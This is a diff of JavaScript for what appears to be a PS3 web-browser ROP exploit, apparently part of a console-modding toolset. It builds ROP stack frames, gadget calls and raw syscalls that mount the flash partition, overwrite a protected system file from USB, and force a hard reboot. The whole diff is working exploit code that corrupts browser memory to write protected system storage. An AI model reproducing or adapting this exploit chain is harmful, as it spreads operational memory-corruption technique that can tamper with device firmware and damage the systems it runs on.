@@ -9,39 +9,23 @@ function initROP(init)
 {
 	try
 	{
-		if(init===true){frame_fails=0;search_base_off=0;search_size_ext=0;}
-		if(t_out!==0){clearTimeout(t_out);t_out=0;}
-		offset_array=[];
-		disable_all();
-		clearLogEntry();
-		store_idx_arr1=new Array(1);
-		store_idx_arr2=new Array(1);
-		xtra_data_addr=0;
-		stack_frame_addr=0;
-		jump_2_addr=0;
-		jump_1_addr=0;
-
-		var search_max_threshold=70*0x100000; // 70Mb maximum memory search
-		var search_base=0x80200000;//0x80190000;//
-		var search_size=2*mbytes;
-		search_base_off=0*mbytes;
-		search_size_ext=2*mbytes;
-		total_loops++;
+		init_run(init,0x80200000,5/2*mbytes,0*mbytes,0*mbytes);
 		
 		// Overwrite filename and destination path here
 		template_1_file_usb='/yourchannels.png';
 		template_1_file_blind='/dev_blind/vsh/resource/explore/icon/yourchannels.png';
 		
-		xtra_data=flash_partition.convert()
+		xtra_data=(start_x+flash_partition).convert()
 		+filesystem.convert()
 		+mount_path.convert()
 		+getPath(template_1_file_usb).convert()
 		+fill_by_4bytes(0xC,dbyte00)
 		+template_1_file_blind.convert()
-		+make_padding_xtra()
+		+fill_by_4bytes(0xC,dbyte00)
 		+fill_by_16bytes(0x70,dbyte00)
-		+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41)+callsub(gadget12_addr,2,0,0,0,0,0,0,0,0,0x80)+syscall(sc_sm_shutdown,hard_reboot,0,0,0,0,0,0,0)
+		+reboot_frame(hard_reboot)
 		+unescape("\uFD7E");
+		
 		while(xtra_data_addr===0)
 		{
 			if(search_max_threshold<search_size){load_check();return;}
@@ -51,7 +35,7 @@ function initROP(init)
 		}
 		
 		flash_partition_addr=xtra_data_addr;
-		fs_addr=flash_partition_addr+flash_partition.convertedSize()-0x4;
+		fs_addr=flash_partition_addr+flash_partition.convertedSize();
 		mount_path_addr=fs_addr+filesystem.convertedSize();
 		
 		template_1_file_usb_addr=mount_path_addr+mount_path.convertedSize();
@@ -63,18 +47,18 @@ function initROP(init)
 		template_1_file_blind_writelen_addr=template_1_file_blindfd_addr+word_size;
 		store_idx_arr1[0]=(template_1_file_blind_writelen_addr-flash_partition_addr+0x8)/2;
 		
-		null_addr=template_1_file_blind_writelen_addr+dword_size+make_padding_null()+dword_size;
-		
-		store_idx_arr2[0]=(null_addr-flash_partition_addr+0xC)/2;
-		stat_addr=null_addr+dword_size*0x3;
-		reboot_sf_addr=stat_addr+dword_size*0xB;
-		//############################ Building stack frame ###############################################################
+		null_addr=template_1_file_blind_writelen_addr+dword_size;
+		saved_stat_addr=null_addr+dword_size;
+		store_idx_arr2[0]=(saved_stat_addr-flash_partition_addr+0x4)/2;
+		stat_addr=saved_stat_addr+dword_size;
+		reboot_sf_addr=stat_addr+dword_size*0xC;
+		<!-- ## Building stack frame ## -->
 		stack_frame=stack_frame_hookup()
 		+syscall(sc_fs_umount,flash_partition_addr,fs_addr,mount_path_addr,0,0,0,0,0)
-		+copy_file_overwrite(template_1_file_usb_addr,template_1_file_blind_addr,template_1_file_usbfd_addr,template_1_file_blindfd_addr,template_1_file_buf_addr,template_1_file_usb_readlen_addr,template_1_file_blind_writelen_addr,stat_addr,null_addr,null_addr+0x8)
-		+optional_reboot1(reboot_sf_addr,template_1_file_blind_writelen_addr)
+		+copy_file_overwrite(template_1_file_usb_addr,template_1_file_blind_addr,template_1_file_usbfd_addr,template_1_file_blindfd_addr,template_1_file_buf_addr,template_1_file_usb_readlen_addr,template_1_file_blind_writelen_addr,stat_addr,null_addr,saved_stat_addr)
+		+optional_reboot_new(reboot_sf_addr,template_1_file_blind_writelen_addr)
 		+stack_frame_exit();
-		//############################ End stack frame ###############################################################	
+		<!-- ## End stack frame ## -->		
 		
 		
 		//############################ Find remaining offsets ########################################################
@@ -140,35 +124,9 @@ function triggerX()
 		clearLogEntry();
 		disable_all();
 		setTimeout(trigger,1000,jump_1_addr);
-		setTimeout(rop_exit_3val,2000,hr+"<h1><b><font color=%22386E38%22>HAN XML Auto Template Installation succeeded!</font></span></b></h1>",hr+"<h1><b><font color='red'>HAN XML Auto Template Installation failed!</font></b></h1><h3><b><span style='color:#000000;'>Error copying file(s):</span></b></h3>","<h3><b><span style='color:#000000;'>explore_plugin_full.rco</span></b></h3>");
+		setTimeout(rop_exit_1val,2000,hr+"<h1><b><font color=%22386E38%22>HAN XML Auto Template Installation succeeded!</font></span></b></h1>",hr+"<h1><b><font color='red'>HAN XML Auto Template Installation failed!</font></b></h1><h3><b><span style='color:#000000;'>Error copying file(s):</span></b></h3>","<h3><b><span style='color:#000000;'>yourchannels.png</span></b></h3>");
 		setTimeout(window.close,2000);
 		cleanGUI();
-}
-function make_padding_xtra()
-{
-	return fill_by_4bytes(0xC,dbyte00)
-	+getPath(dummy1_usb).convert()
-	+fill_by_4bytes(0xC,dbyte00)
-	+dummy1_blind.convert()
-	+fill_by_4bytes(0xC,dbyte00)
-	+getPath(dummy2_usb).convert()
-	+fill_by_4bytes(0xC,dbyte00)
-	+dummy2_blind.convert()
-	+fill_by_4bytes(0xC,dbyte00);
-}
-function make_padding_null()
-{
-	return dummy1_usb_addr+getPath(dummy1_usb).convertedSize()
-	+dummy1_usbfd_addr+word_size
-	+dummy1_usb_readlen_addr+dword_size
-	+dummy1_blind_addr+dummy1_blind.convertedSize()
-	+dummy1_blindfd_addr+word_size
-	+dummy1_blind_writelen_addr+dword_size
-	+dummy2_usb_addr+getPath(dummy2_usb).convertedSize()
-	+dummy2_usbfd_addr+word_size
-	+dummy2_usb_readlen_addr+dword_size
-	+dummy2_blind_addr+dummy2_blind.convertedSize()
-	+dummy2_blindfd_addr+word_size;
 }
 </script>
 </head>
